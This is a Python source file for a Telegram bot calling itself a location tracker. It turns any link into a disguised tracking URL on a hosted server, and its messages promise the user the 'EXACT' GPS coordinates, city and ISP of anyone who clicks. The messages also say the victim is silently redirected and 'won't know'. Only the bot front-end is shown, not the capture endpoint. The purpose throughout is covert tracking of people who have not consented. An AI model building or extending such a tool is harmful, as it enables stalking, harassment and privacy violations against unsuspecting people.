# simple_bot.py - FULL TRACKING BOT
import os
import logging
import requests
import json
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

# Setup
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Token
BOT_TOKEN = os.environ.get('BOT_TOKEN')

if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN not set!")
    exit(1)

logger.info("✅ Bot started!")

# ============================================
# DATA STORAGE
# ============================================
user_links = {}
tracking_data = {}

# ============================================
# HELPERS
# ============================================

def generate_slug():
    import random
    import string
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

def create_tracking_link(slug):
    base_url = os.environ.get('RENDER_URL', 'https://location-tracker-xyai.onrender.com')
    return f"{base_url}/track/{slug}"

def get_google_maps_link(lat, lon):
    return f"https://www.google.com/maps?q={lat},{lon}&z=15"

# ============================================
# COMMANDS
# ============================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [
            InlineKeyboardButton("🔗 Create Link", callback_data="create"),
            InlineKeyboardButton("📋 My Links", callback_data="links")
        ],
        [
            InlineKeyboardButton("📊 Stats", callback_data="stats"),
            InlineKeyboardButton("📡 Monitor", callback_data="monitor")
        ],
        [
            InlineKeyboardButton("❓ Help", callback_data="help")
        ]
    ]
    
    await update.message.reply_text(
        "🚀 <b>LOCATION TRACKER BOT</b>\n\n"
        "Send me ANY link (YouTube, TikTok, etc.) and I'll create a tracking link!\n\n"
        "<b>How it works:</b>\n"
        "1️⃣ Send me a link (e.g., https://vt.tiktok.com/xxx)\n"
        "2️⃣ I create a tracking link\n"
        "3️⃣ Share the tracking link with ANYONE\n"
        "4️⃣ When they click it → I send you their EXACT location\n"
        "5️⃣ They get redirected to your original link\n\n"
        "📍 <b>You'll see their location on Google Maps!</b>\n\n"
        "👇 <b>Send me a link to get started!</b>",
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 <b>HELP</b>\n\n"
        "1. Send me any link (YouTube, TikTok, etc.)\n"
        "2. I create a tracking link for you\n"
        "3. Share the tracking link\n"
        "4. Get location when someone clicks it!\n\n"
        "📍 <b>You'll receive:</b>\n"
        "• EXACT GPS coordinates\n"
        "• Google Maps link\n"
        "• Location pin in Telegram\n"
        "• City, Country, ISP info\n\n"
        "🔗 <b>Send me a link NOW!</b>",
        parse_mode='HTML'
    )

async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = update.effective_user.id
    
    if not text.startswith(('http://', 'https://')):
        await update.message.reply_text("❌ Please send a valid link starting with http:// or https://")
        return
    
    slug = generate_slug()
    
    tracking_data[slug] = {
        'redirect': text,
        'owner': user_id,
        'visits': [],
        'created': datetime.now().isoformat()
    }
    
    if user_id not in user_links:
        user_links[user_id] = []
    user_links[user_id].append({
        'slug': slug,
        'redirect': text,
        'visits': 0,
        'created': datetime.now().isoformat()
    })
    
    tracking_link = create_tracking_link(slug)
    
    await update.message.reply_text(
        f"✅ <b>TRACKING LINK CREATED!</b>\n\n"
        f"🔗 <b>Your tracking link:</b>\n"
        f"<code>{tracking_link}</code>\n\n"
        f"🎯 <b>Redirects to:</b>\n"
        f"<code>{text}</code>\n\n"
        f"📍 <b>Share this link!</b>\n"
        f"When someone clicks it, you'll get their location!\n\n"
        f"🔄 They'll be redirected to your link - they won't know!",
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📋 My Links", callback_data="links")],
            [InlineKeyboardButton("🔗 Create Another", callback_data="create")]
        ])
    )

# ============================================
# BUTTON HANDLERS
# ============================================

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user_id = update.effective_user.id
    
    if data == "create":
        await query.edit_message_text(
            "🔗 <b>CREATE A TRACKING LINK</b>\n\n"
            "Simply send me any link (YouTube, TikTok, etc.)\n\n"
            "📤 <b>Send me a link NOW!</b>",
            parse_mode='HTML'
        )
    
    elif data == "links":
        if user_id not in user_links or not user_links[user_id]:
            await query.edit_message_text(
                "📋 <b>YOUR LINKS</b>\n\n"
                "You haven't created any links yet.\n\n"
                "Send me a link to create your first tracking link!",
                parse_mode='HTML'
            )
            return
        
        message = "📋 <b>YOUR TRACKING LINKS</b>\n\n"
        for link in user_links[user_id]:
            message += f"🔗 <b>{link['slug']}</b>\n"
            message += f"   🎯 {link['redirect'][:40]}...\n"
            message += f"   👤 {link['visits']} visits\n"
            message += f"   📅 {link['created'][:10]}\n\n"
        
        await query.edit_message_text(message, parse_mode='HTML')
    
    elif data == "stats":
        total_links = len(user_links.get(user_id, []))
        total_visits = 0
        for link in user_links.get(user_id, []):
            total_visits += link['visits']
        
        await query.edit_message_text(
            f"📊 <b>YOUR STATISTICS</b>\n\n"
            f"📌 Total Links: {total_links}\n"
            f"👤 Total Visitors: {total_visits}\n\n"
            f"Send me a link to start tracking!",
            parse_mode='HTML'
        )
    
    elif data == "monitor":
        if user_id not in user_links or not user_links[user_id]:
            await query.edit_message_text(
                "📡 <b>LIVE MONITOR</b>\n\n"
                "No links yet.",
                parse_mode='HTML'
            )
            return
        
        message = "📡 <b>RECENT VISITS</b>\n\n"
        found = False
        for link in user_links[user_id][:5]:
            if link['visits'] > 0:
                found = True
                message += f"🔗 {link['slug']}: {link['visits']} visits\n"
        
        if not found:
            message += "No visits yet. Share your links!\n"
        
        await query.edit_message_text(message, parse_mode='HTML')
    
    elif data == "help":
        await query.edit_message_text(
            "📖 <b>HOW TO USE</b>\n\n"
            "1. Send me ANY link\n"
            "2. I create a tracking link\n"
            "3. Share the tracking link\n"
            "4. Get location when someone clicks!\n\n"
            "📍 <b>You'll see their location on Google Maps!</b>\n\n"
            "🔗 <b>Send me a link NOW!</b>",
            parse_mode='HTML'
        )
    
    keyboard = [[InlineKeyboardButton("🔙 Menu", callback_data="back")]]
    await query.message.edit_reply_markup(reply_markup=InlineKeyboardMarkup(keyboard))

async def back_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [
            InlineKeyboardButton("🔗 Create Link", callback_data="create"),
            InlineKeyboardButton("📋 My Links", callback_data="links")
        ],
        [
            InlineKeyboardButton("📊 Stats", callback_data="stats"),
            InlineKeyboardButton("📡 Monitor", callback_data="monitor")
        ],
        [
            InlineKeyboardButton("❓ Help", callback_data="help")
        ]
    ]
    
    await query.edit_message_text(
        "🚀 <b>LOCATION TRACKER BOT</b>\n\n"
        "Send me ANY link to create a tracking link!\n\n"
        "📍 <b>You'll get their EXACT location on Google Maps!</b>\n\n"
        "👇 <b>Send me a link now!</b>",
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ============================================
# MAIN
# ============================================

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link))
    app.add_handler(CallbackQueryHandler(button_handler, pattern="^(create|links|stats|monitor|help)$"))
    app.add_handler(CallbackQueryHandler(back_handler, pattern="^back$"))
    
    logger.info("🚀 Bot is running! Send me a link to start tracking!")
    app.run_polling()

if __name__ == "__main__":
    main()
